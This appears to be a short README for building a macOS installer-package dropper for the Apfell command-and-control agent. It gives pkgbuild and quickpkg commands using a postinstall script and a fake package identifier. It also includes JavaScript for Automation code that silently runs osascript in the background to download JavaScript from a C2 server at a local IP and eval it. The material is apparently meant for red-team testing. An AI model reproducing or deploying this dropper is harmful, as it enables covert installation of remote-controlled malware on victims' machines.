# apfell-payload
Making pkg payload from Javascript app


## Making the pkg payload
`pkgbuild --root ~/Documents/tech_infosec/apfell-testing/payloads/apfell_pkg_installer_dropper/ --scripts scripts --install-location /tmp --identifier my.fake.pkg my_package.pkg`


### Using this script to make pkg because pkgbuild is fickle
Script: https://github.com/scriptingosx/quickpkg

`python quickpkg --install-location /tmp --postinstall ./Scripts/postinstall.sh apfelljxa.app`


### Creating apfelljxa.app with Script Editor

Create apfelljxa.app with the following Javascript:

`var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.168.0.108:80/api/v1.4/files/download/8e3e832d-ffc1-416a-8d77-f578759e0c69')), $.NSUTF8StringEncoding)));\" &>/dev/null &");`

Exclude Examples folder when building the .pkg
